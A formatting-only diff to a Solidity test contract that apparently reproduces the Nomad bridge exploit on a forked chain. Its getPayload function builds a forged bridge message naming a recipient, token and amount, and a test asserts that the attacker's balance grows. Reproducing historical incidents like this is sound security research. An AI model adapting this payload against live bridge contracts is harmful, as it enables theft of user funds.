@@ -34,8 +34,8 @@ contract Exploit_Nomad is TestHarness, TokenBalanceTracker {
     IERC20 constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
 
     function setUp() external {
-        cheat.createSelectFork(vm.envString("RPC_URL"), 15259100); // We pin one block before the attacker
-            // starts to drain the bridge after he sent the 0.1 WBTC tx on Moonbeam.
+        cheat.createSelectFork(vm.envString("RPC_URL"), 15_259_100); // We pin one block before the attacker
+        // starts to drain the bridge after he sent the 0.1 WBTC tx on Moonbeam.
         cheat.label(NOMAD_DEPLOYER, "Nomad Deployer");
 
         addTokenToTracker(address(WBTC));
@@ -67,11 +67,7 @@ contract Exploit_Nomad is TestHarness, TokenBalanceTracker {
         assertGe(balanceAttackerAfter, balanceAttackerBefore);
     }
 
-    function getPayload(address recipient, address token, uint256 amount)
-        public
-        pure
-        returns (bytes memory)
-    {
+    function getPayload(address recipient, address token, uint256 amount) public pure returns (bytes memory) {
         bytes memory payload = abi.encodePacked(
             MOONBEAM, // Home chain domain
             uint256(uint160(bridgeRouter)), // Sender: bridge
@@ -84,15 +80,15 @@ contract Exploit_Nomad is TestHarness, TokenBalanceTracker {
             uint256(uint160(recipient)), // Recipient of the transfer
             uint256(amount), // Amount (e.g. 10000000000)
             uint256(0) // Optional: Token details hash
-                // keccak256(
-                //     abi.encodePacked(
-                //         bytes(tokenName).length,
-                //         tokenName,
-                //         bytes(tokenSymbol).length,
-                //         tokenSymbol,
-                //         tokenDecimals
-                //     )
-                // )
+            // keccak256(
+            //     abi.encodePacked(
+            //         bytes(tokenName).length,
+            //         tokenName,
+            //         bytes(tokenSymbol).length,
+            //         tokenSymbol,
+            //         tokenDecimals
+            //     )
+            // )
         );
 
         return payload;
